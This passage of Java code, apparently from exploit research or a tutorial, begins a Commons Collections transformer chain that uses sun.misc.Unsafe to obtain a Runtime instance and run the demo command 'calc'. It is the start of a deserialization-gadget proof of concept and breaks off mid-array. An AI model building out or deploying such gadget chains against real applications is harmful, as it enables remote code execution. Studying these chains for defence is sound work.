...
public class UnsafeChainTrans {
    public static <Methods> void main(String[] args) throws InvocationTargetException, NoSuchMethodException, IllegalAccessException, ClassNotFoundException, InstantiationException {
        // 定义需要执行的本地系统命令
        String cmd = "calc";
        Class unSafeClass=Class.forName("sun.misc.Unsafe");
        Constructor unSafeConstuctor=unSafeClass.getDeclaredConstructor();
        unSafeConstuctor.setAccessible(true);
        Unsafe unSafe=(Unsafe) unSafeConstuctor.newInstance();
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(unSafe),
                new InvokerTransformer("allocateInstance",new Class[]{Class.class},new Object[]{Runtime.class}),
